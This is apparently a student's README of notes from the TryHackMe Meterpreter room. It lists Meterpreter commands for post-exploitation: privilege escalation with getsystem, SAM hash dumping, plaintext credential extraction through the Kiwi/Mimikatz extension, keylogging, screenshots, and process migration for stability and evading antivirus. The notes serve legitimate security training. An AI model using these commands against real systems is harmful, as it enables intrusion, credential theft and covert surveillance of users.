# Room: Metasploit - Meterpreter - TryHackMe

This folder documents my notes and hands-on experience from the **Metasploit: Meterpreter** module on TryHackMe. It follows the *Metasploit: Exploitation* room and dives deep into Meterpreter — Metasploit's flagship payload for stealthy, stable post-exploitation.

## 🎯 Learning Objectives

*   Understand **what Meterpreter is** and how it operates in memory.
*   Navigate the different **Meterpreter command categories**.
*   Perform **post-exploitation**: recon, privilege escalation, and credential harvesting.
*   Use **process migration** for stability and evasion.

---

## 🧬 1. What is Meterpreter?

Meterpreter is an advanced, dynamically extensible payload that runs **entirely in memory** (DLL injection) — it never touches the disk, which helps evade antivirus. All communication between the attacker and the target is **encrypted (TLS)** and channelled over a single session, making the traffic harder to detect and inspect.

> **Key idea:** Because Meterpreter lives inside a host process, its stability depends on that process. If the process dies, so does your session — which is why *migration* matters.

---

## 🗂️ 2. Command Categories

Meterpreter groups its commands by purpose. `help` lists everything available in the current session.

```bash
# --- Core ---
help                 # list available commands
background           # send session to the background (keep it alive)
sessions             # list / switch sessions (from msfconsole)
migrate <PID>        # move Meterpreter into another process
load <extension>     # load an extension (e.g. kiwi, python)
guid                 # session GUID
```

```bash
# --- File System ---
pwd                  # print working directory
ls / cd / cat        # navigate & read
download <file>      # pull a file from target -> attacker
upload <file>        # push a file attacker -> target
search -f *.txt      # find files by pattern
edit / rm            # modify / delete
```

```bash
# --- Networking ---
ipconfig / ifconfig  # interfaces
netstat              # active connections
arp                  # ARP cache
portfwd add -l 3389 -p 3389 -r <TARGET>   # local port forward
route                # view / manipulate routing (pivoting)
```

```bash
# --- System ---
sysinfo              # OS, architecture, hostname
getuid               # current user context
getpid / ps          # current PID / process list
getprivs             # available privileges
shell                # drop into a native OS shell
execute -f <prog>    # run a program on the target
```

---

## 🔐 3. Post-Exploitation Essentials

Once a Meterpreter session is stable, these are the high-value actions:

```bash
# Privilege escalation
getsystem            # attempt to become NT AUTHORITY\SYSTEM

# Credential harvesting
hashdump             # dump local SAM password hashes
load kiwi            # load Mimikatz (Kiwi) extension
creds_all            # retrieve plaintext creds / tickets via Kiwi

# Recon & data collection
screenshot           # capture the target's desktop
keyscan_start        # start keylogging
keyscan_dump         # dump captured keystrokes
idletime             # how long the user has been idle
```

---

## 🧠 Lessons Learned

*   **Migration is the priority after landing a session.** Injecting into a stable, appropriately privileged process (e.g. `explorer.exe` or an LSASS-adjacent SYSTEM process) prevents losing the session and can grant better context.
*   **In-memory execution ≠ invisible.** Meterpreter avoids disk artifacts, but encrypted C2 traffic and unusual process behaviour can still be flagged by EDR — a reminder that OPSEC is about the whole footprint, not one indicator.
*   **`load kiwi` is powerful but privilege-dependent.** Plaintext credential extraction generally requires SYSTEM, which ties back to getting `getsystem`/`migrate` right first.

---
*Disclaimer: All activities were performed legally within TryHackMe's sandboxed lab environment for educational purposes.*
